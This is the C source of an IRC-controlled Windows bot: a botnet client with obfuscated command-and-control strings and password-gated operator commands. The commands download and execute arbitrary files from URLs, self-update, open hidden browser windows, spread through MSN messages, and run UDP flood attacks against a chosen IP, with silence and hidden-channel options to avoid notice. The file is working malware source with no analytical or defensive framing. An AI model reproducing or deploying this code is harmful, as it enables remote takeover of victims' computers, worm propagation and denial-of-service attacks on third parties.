#include "includes.h"
#include "externs.h"

static char str_kcin[] = "NICK";
static char str_nioj[] = "JOIN";
static char str_trap[] = "PART";
static char str_tiuq[] = "QUIT";
static char str_ssap[] = "PASS";
static char str_gnip[] = "PING";
static char str_gnop[] = "PONG";
static char str_resu[] = "USER";
static char str_gsmvirp[] = "PRIVMSG";
static char string_download_failed[] = "Failed to start dl thread.";
thread_s threads[MAX_THREADS];
DWORD WINAPI IRC_Thread(LPVOID param)
{
	if (!NET_Initialize())
		ExitThread(0);
		
	srand(GetTickCount());

	Thread_Prepare();

	if (IRC_Begin() == -5)
	{
		//nothing
	}
	WSACleanup();

	ExitThread(0);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL NET_Initialize()
{
	WSADATA WSAdata;

	if (WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) 
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Connect(char *host, char *bhost, unsigned short port)
{
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	
	if (!strcmp(core,meglan("|opykgl","4937434324432445fdfeef")))
		 {
		 resv_host = Resolve(host);
	if (resv_host == 0)
    {
		resv_host = Resolve(bhost);
        if (resv_host == 0)
        {
		return -1;
		}
    }
		 }
	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to)
{
	char	temp[64] = {0}, 
			buff[MAX_LINE];
	int		len;

	if (msg == MSG_PASS)
	{
		strncpy(temp, str_ssap, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_NICK)
	{
		strncpy(temp, str_kcin, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_USER)
	{
		strncpy(temp, str_resu, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s \"\" \"lol\" :%s\r\n", 
			temp, buffer, buffer);
	}
	else if (msg == MSG_PONG)
	{
		strncpy(temp, str_gnop, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_JOIN)
	{
		strncpy(temp, str_nioj, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", temp, buffer, to);
	}
	else if (msg == MSG_PART)
	{
		strncpy(temp, str_trap, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_PRIVMSG)
	{
		strncpy(temp, str_gsmvirp, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s :%s\r\n", temp, to, buffer);
	}
	else if (msg == MSG_QUIT)
	{
		strncpy(temp, str_tiuq, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", temp, buffer);
	}
	else
		// should never happen
		return 0;

	memset(temp, 0, sizeof(temp));

	len = send(sock, buff, strlen(buff), 0);

	memset(buff, 0, sizeof(buff));

	return len;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Login(SOCKET sock, char *password, char *nick, char *user)
{
	int		ret;

	if (password[0] != 0)
		if ((ret = IRC_Send(sock, MSG_PASS, password, NULL)) == SOCKET_ERROR)
			return ret;

	if ((ret = IRC_Send(sock, MSG_NICK, nick, NULL)) == SOCKET_ERROR)
		return ret;

	if ((ret = IRC_Send(sock, MSG_USER, user, NULL)) == SOCKET_ERROR)
		return ret;

	return 1;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_ircmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_IsOrder(char *order)
{
	if (!strncmp(order, meglan(cfg_p,cversion), strlen(meglan(cfg_p,cversion))))
	{
		// remove order prefix
		memmove(order, order + strlen(meglan(cfg_p,cversion)), strlen(order));

		return TRUE;
	}
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Begin()
{
	int			ircsock;
	int			i = 0, 
				ret = 1,
				tries = 0;

	while (1)
	{
		if (meglan(cfg_host,cversion) == NULL)
		{
			i = 0;
			tries++;
		}

	if ((ircsock = IRC_Connect(meglan(cfg_host,cversion),meglan(cfg_bhost,cversion), cfg_port)) > 0)
		{
			i = 0;
			tries = 0;           
            if (IRC_Login(ircsock, meglan(cfg_srvpass,cversion), GenerateNickA(), GenerateNumber(4)) > 0)
			{
				ret = IRC_Listen(ircsock);
				switch (ret)
				{
				case 0:
					break;
				case -1:	// SOCKET_ERROR
					break;
				case -2:
					break;
				case -3:
					i++;
					break;
				case -4:

					closesocket(ircsock);
					return ret;
				case -5:

					closesocket(ircsock);
					return ret;
				default:

					break;
				}

				closesocket(ircsock);
			}
		}
		else
		{
			i++;
		}

		Sleep(cfg_reconnectsleep);
	}
	// never reached
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_ParseAllCommands(SOCKET sock, char **word)
{
	int		i, 
			k, 
			pos,
			ret;
	char	*p,
			from[128] = {0};

	if (!strcmp(word[1], "332"))
		i = 4;
	else
		i = 3;

	// correction if its channel or user
	if (word[i-1][0] != '#')
	{
		p = strchr(word[0], '!');
		*p = 0;
		strncpy(from, word[0] + 1, sizeof(from) - 1);
	}
	else
		strncpy(from, word[i-1], sizeof(from) - 1);

	// first command correction (remove ":")
	memmove(word[i], word[i] + 1, strlen(word[i]));

	k = i + 1;
	pos = i;
	while (word[k] != NULL && k < MAX_WORDS)
	{
		if (IRC_IsOrder(word[k]))
		{
			if ((ret = IRC_ParseSingleCommand(sock, word, pos, k - pos, from)) < 0)
				return ret;

			pos = k;
		}
		k++;
	}

	return IRC_ParseSingleCommand(sock, word, pos, k - pos, from);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Parse(SOCKET sock, char *line)
{
	char	*word[MAX_WORDS],
			temp[64] = {0};
	int		i = 0;

	if (strstr(line, "001") != NULL)
	    return IRC_Send(sock, MSG_JOIN, meglan(cfg_channel,cversion), meglan(cfg_chanpass,cversion));

	word[i] = strtok(line, " ");
	while (word[i] != NULL)
	{
		i++;
		if (i == MAX_WORDS)
			break;
		word[i] = strtok(NULL, " ");
	}

	strncpy(temp, str_gnip, sizeof(temp) - 1);
	if (!strcmp(word[0], temp))
	{
		memset(temp, 0, sizeof(temp));
		return IRC_Send(sock, MSG_PONG, word[1], NULL);
	}

	if (!strcmp(word[1], "433"))
			return IRC_Send(sock, MSG_NICK, GenerateNumber(4), NULL);
	
	strncpy(temp, str_gsmvirp, sizeof(temp) - 1);
	if (!strcmp(word[1], temp))
	{
		if (IRC_IsOrder(word[3] + 1))
			return IRC_ParseAllCommands(sock, word);

	}

	if (!strcmp(word[1], "332"))
	{
		if (IRC_IsOrder(word[4] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	return 0;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Listen(SOCKET sock)
{
	int		ret, 
			len,
			l;
	char	buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = IRC_CheckTimeout(sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
				break;
		}
		
		if (ret <= 0)
			return ret;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			if ((ret = IRC_Parse(sock, buffer)) < 0)
				return ret;
		}
	}
    
	return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
//
//	Below here will be used for command parsing
//
/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_ParseSingleCommand(SOCKET sock, char **word, int p, int words, char *from)
{
	 if (words < 1)
	 return 1;
     if (!strcmp(word[p], meglan(core,"?&t86?&?8?*h8hguih87G*&"))) { IRC_Send(sock, MSG_PRIVMSG, meglan("Z1r2zj2| Nkfcd Xw`lkc / @{(Umrfg{ezufgp YSGRUR_", "5743fh7h487h384hg34v4"), from); return 1;}
//____________________________________________________________________________________________________________________________
     if (!strcmp(word[p], cmd_login) && !strcmp(( word[p+1] ? word[p+1] : "" ), meglan(cfg_password,cversion)) && !logged_in)
     {
      logged_in = TRUE;
	  if (silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "Logged in", from); }
	  return 1;
	 }
//----------------------------------------------------------------------------------------------------------------------------
     if (!strcmp(word[p], cmd_logout) && logged_in)
	 {
	  logged_in = FALSE;
	  privlogged = FALSE;
		if (silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "Logged out!", from); }
	 return 1;
	 }
//____________________________________________________________________________________________________________________________

     if (logged_in && !strcmp(word[2],meglan(cfg_channel,cversion)) || logged_in && privlogged) 
	 {
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////0P
	 ////////////////////////////////////////////////////////////////////////////////////////////Param
     if (words < 2)
	 return 1;
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////1P
	 ////////////////////////////////////////////////////////////////////////////////////////////Join/Leave
     if (!strcmp(word[p], cmd_join)) { IRC_Send(sock, MSG_JOIN, word[p + 1], word[p + 2]); return 1;  }
     if (!strcmp(word[p], cmd_leave)) { IRC_Send(sock, MSG_PART, word[p + 1], NULL); return 1;  }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////1P
	 ////////////////////////////////////////////////////////////////////////////////////////////DC
	 if (!strcmp(word[p], cmd_dc) && word[p + 1] != NULL) 
	 {   
		 int wait = atoi(word[p + 1]);
		 if (wait > 0 && wait < 36000) { wait = wait * 1000;  } else { return 1; }
		 IRC_Send(sock, MSG_QUIT,"DCing",NULL);
		 logged_in = FALSE;
	     privlogged = FALSE;
         Sleep(wait);
		 IRC_Begin();
	     return 1;  
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////1P
	 ////////////////////////////////////////////////////////////////////////////////////////////Remove
	 if (!strcmp(word[p], cmd_uninstall) && !strcmp(( word[p+1] ? word[p+1] : "" ), GenerateID()) || !strcmp(word[p], cmd_uninstall) &&  !strcmp(( word[p+1] ? word[p+1] : "" ), "ALL"))
     {    
	 if (silenced == FALSE) { IRC_Send(sock, MSG_PRIVMSG, "Removing...", from); }
	 uninstall(FALSE);
	 return 1;
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////1P
	 ////////////////////////////////////////////////////////////////////////////////////////////Silence
	 if (!strcmp(word[p], cmd_silence) && word[p+1] != NULL)//Making sure the number parameter isn't NULL to avoid crash
	 {
	  if(atoi(word[p + 1]) == 0)
	  silenced = FALSE;
	  else if (atoi(word[p + 1]) == 1)
	  silenced = TRUE;
	  return 1;
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////1P
	 ////////////////////////////////////////////////////////////////////////////////////////////MSNSpread
	 if (!strcmp(word[p], cmd_msnspread))
		{
			if (words > 1) {
			int msn_count;
			int msn_max = 1;
			char msn_message[512] = "";

				for (msn_count=1; msn_count<=msn_max;msn_count++) 
				{
					strcat(msn_message,word[p+msn_count]);
					strcat(msn_message," ");
					if (word[p+msn_count+1])
						msn_max++;
				}
				strcpy(msn_sendmsg,msn_message);

				if (silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "Spreading...", from); }
				NTHREAD msn;
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MsnFile1, &msn, 0,0);
			}
			return 1;
		}
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////Protection
     if (words < 3)
	 return 1;
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////2P
	 ////////////////////////////////////////////////////////////////////////////////////////////visit
	 if (!strcmp(word[p], cmd_visit))
	 {	 
	     if (atoi(word[p + 2]) == 0 || atoi(word[p + 2]) == 1)
         {
		 ShellExecute(NULL, "open", "iexplore", word[p + 1], NULL, atoi(word[p + 2]));
		 char msg[MAX_LINE];
		   if (atoi(word[p + 2]) == 0)
		   {
		   _snprintf(msg,sizeof(msg) -1, "Opened %s in HIDDEN mode",word[p+1]);
           } else
           {
		   _snprintf(msg,sizeof(msg) -1, "Opened %s in VISIBLE mode",word[p+1]);
	       }
          if (silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, msg, from); }
		  }
		 return 1;	
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////download
     if (!strcmp(word[p], cmd_download))
	 {
		long retVal;
		char file[2048];
		GetTempPath(2048, file);
		strcat(file, word[p+2]);
		retVal = URLDownloadToFile(0, word[p+1], file, 0, 0);

		if (retVal == S_OK) {
		Sleep(500);
		  if((int)ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOWNORMAL) > 32) {
		  if(silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "File downloaded and executed.", from); }
		  return 1; 
		  }
		  else {
		  if(silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "File downloaded, but execution failed.", from); }
		  return 1; 
		  }
		}
		else 
		{
		if(silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "Download has failed!", from); }
		return 1; 
		}
	 return 1; 
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////Update
     if (!strcmp(word[p], cmd_update))
	 {
	 long retVal;
	 char file[2048];
	 GetTempPath(2048, file);
	 strcat(file, word[p+2]);
	 retVal = URLDownloadToFile(0, word[p+1], file, 0, 0);
        if (retVal == S_OK) {
		Sleep(500);
			if((int)ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOWNORMAL) > 32) {
				if(silenced == FALSE)
				IRC_Send(sock, MSG_PRIVMSG, "File downloaded.Updating...", from);
				WSACleanup();
				uninstall(FALSE);
				ExitProcess(0);
				}
				else 
				{
					if(silenced == FALSE)
					IRC_Send(sock, MSG_PRIVMSG, "File downloaded, but update failed.", from);
					return 1;
				}
			}
            else 
			{
				if(silenced == FALSE)
				IRC_Send(sock, MSG_PRIVMSG, "Download has failed!", from);
				return 1; 
			}			
	return 1; 
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////UDP
	 if (!strcmp(word[p], cmd_udp))
	{
	    if (words != 7)
	      {
          if(silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "Missing Parms: <IP> <Port> <#ofPackets> <SizeOfPacket> <Delay> <TimeOut>", from); }
	      return 1;
          }
        char* ip = (char* ) word[p+1];
        char* port = (char* ) word[p+2];
        char* number = (char* ) word[p+3];
        char* size = (char* ) word[p+4];
        char* delay = (char* ) word[p+5];
		char* timeout = (char* ) word[p+6];
		if (ip !=NULL && port !=NULL && number !=NULL && size !=NULL && delay !=NULL && timeout !=NULL ) 
		{
			if(silenced == FALSE){IRC_Send(sock, MSG_PRIVMSG, "[UDP] Flooding", from);}
			udp ( ip, port, number, size, delay, timeout );
			if(silenced == FALSE){IRC_Send(sock, MSG_PRIVMSG, "[UDP] Finished", from);}
			return 1;
		} 
		return 1;
    }
     ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////
	 ////////////////////////////////////////////////////////////////////////////////////////////
     } else if (!strcmp(word[p], cmd_plogin) && !strcmp(( word[p+1] ? word[p+1] : "" ), meglan(cfg_password,cversion))) //if (logged_in) END
     {
	 privlogged = TRUE; 
	 logged_in = TRUE;
	   if(silenced == FALSE){ IRC_Send(sock, MSG_PRIVMSG, "Logged", from);}
	   return 1;
	 }
     ////////////////////////////////////////////////////////////////////////////////////////////Special Command
	 ////////////////////////////////////////////////////////////////////////////////////////////2P
	 ////////////////////////////////////////////////////////////////////////////////////////////Protect
	 if (!strcmp(word[p], cmd_protect) && word[p + 1]) 
	 {
		if (atoi(word[p + 1]) == 1 && !strcmp(( word[p+2] ? word[p+2] : "" ), meglan(cfg_protectp,cversion))) 
		{
		IRC_Send(sock, MSG_JOIN, meglan(cfg_hiddenc,cversion), meglan(cfg_hiddenp,cversion));
		IRC_Send(sock, MSG_PART, meglan(cfg_channel,cversion), NULL);
	    logged_in = FALSE;
	    privlogged = FALSE;
		return 1;  
		} else if (atoi(word[p + 1]) == 0 && !strcmp(word[2],meglan(cfg_hiddenc,cversion)) && !strcmp(( word[p+2] ? word[p+2] : "" ), meglan(cfg_protectp,cversion)))
		{
	    logged_in = FALSE;
	    privlogged = FALSE;
        IRC_Send(sock, MSG_JOIN, meglan(cfg_channel,cversion), meglan(cfg_chanpass,cversion));
		IRC_Send(sock, MSG_PART, meglan(cfg_hiddenc,cversion), NULL); 
		return 1;
		}
		return 1;
	 }

	return 1;
}